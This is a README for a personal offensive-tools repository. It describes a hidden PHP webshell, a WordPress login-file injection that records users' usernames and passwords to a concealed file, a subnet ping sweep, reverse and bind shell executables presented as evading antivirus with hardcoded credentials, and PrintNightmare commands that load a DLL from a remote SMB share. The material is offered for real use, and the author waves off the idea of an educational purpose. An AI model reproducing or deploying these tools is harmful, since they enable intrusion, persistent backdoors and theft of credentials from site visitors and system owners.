# JustRepository

Testing project

## Getting Started

These are some repository tools and code I made for fun (?). I want to say "use this for educational purposes only" but I know it won't change your evil thoughts.

### Webshell.php

simple webshell that protected with parameter.
Upload shell. rename it with ".page.backup.php". 
Call it with your own parameter:
```
example.com/uploads/.page.backup.php?dxnboy=4343
```
Modified from:

* **Flozz** - *PHP shell* - [P0wny Shell](https://github.com/flozz/p0wny-shell)

### Inject Wordpress

Inject user.php in wordpress to record credentials that login (kind of keylogger). Required user priviledge that can write to wordpress directory. 
edit file wordpress/wp-include/user.php. Just note for real world usage there will be many login attemp if login page is exposed by default because people using bots to bruteforce, means that .txt file logger will has a lot of false negative and large data

before
```
if ( ! empty( $credentials['remember'] ) ) {
                $credentials['remember'] = true;
} else {
                $credentials['remember'] = false;
}
```

after inject
```
if ( ! empty( $credentials['remember'] ) ) {
                $credentials['remember'] = true;
                date_default_timezone_set('Asia/Jakarta');
                $credz = date('Y-m-d H:i:s') . " || IP: " . get_client_ip() . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
} else {
                $credentials['remember'] = false;
                date_default_timezone_set('Asia/Jakarta');
                $credz = date('Y-m-d H:i:s') . " || IP: " . get_client_ip() . " || Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'];
                file_put_contents('wp-content/uploads/.page.txt', base64_encode($credz).PHP_EOL, FILE_APPEND);
}
```

Encoded with base64. call it in: and decode it with base64
```
wordpress/wp-content/uploads/.page.txt
```

### ping.sh
Simpe ping with bash. or you can use this simple script through command line with this:
```
time for i in {1..254}; do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
```
### Reverse shell Evade Defender AV
In case nc.exe blocked or need single command line reverse shell on limited RCE or single click reverse shell. Using python 2.7 (os,socket,subprocess,threading) converted in exe binary spawn \windows\system32\cmd. Evade by encrypt with base64 and simple print argument. Catch with ncat for rev and meterpreter session for mrev
```
.\rev444
.\mrev4444
```
```
Usage: sel <target ip> <Port #>
.\sel 10.10.14.2 4141
```
### Awesome Backdoor Windows Bind Shell
Windows compiled x64 python exe bindshell Modified from:
* **NullByte** - *Windows Python Bind Shell* - [Python Bind Shell](https://null-byte.wonderhowto.com/how-to/create-bind-shell-python-0163951/)

bind-dxntboy-8282.exe has green status from virus total and can be run on updated Win 10 Enterprise (atleast until today it created). Bind to port 8282, USER:dxntboy, PASS:pass and ready to go. Default pipe from script will bind up to 5 connection. Will compile in stealth mode (no cmd pop up and running in background) if I has to use in real world and will mutate encoding base64 using tool from neetspooky base64 mutate. Run bind-dxntboy-8282.exe file and connect via ncat
```
nc <target> 8282
```

### SharpPrintNightmare.exe

* **cube0x0** - *CVE-2021-1675* - [SharpPrintNightmare](https://github.com/cube0x0/CVE-2021-1675)
```
#LPE
C:\SharpPrintNightmare.exe C:\addCube.dll

#RCE using existing context
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.20'

#RCE using runas /netonly
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.10' hackit.local domain_user Pass123
 ```
